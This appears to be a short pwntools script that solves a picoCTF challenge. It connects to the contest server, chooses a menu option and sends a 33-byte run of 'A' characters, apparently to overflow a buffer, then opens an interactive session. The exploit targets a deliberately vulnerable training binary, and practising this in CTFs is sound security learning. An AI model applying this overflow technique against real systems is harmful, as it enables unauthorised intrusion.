from pwn import *

#p=process('./chall')
p=remote("tethys.picoctf.net", 57419)
print( p.recv().decode("utf-8")+"\n")
p.write("2\n")
p.write("A"*33+"\n")

print( p.recv().decode("utf-8")+"\n")
p.interactive()
p.write("4\n")
#p.interactive()
print( p.recv().decode("utf-8")+"\n")
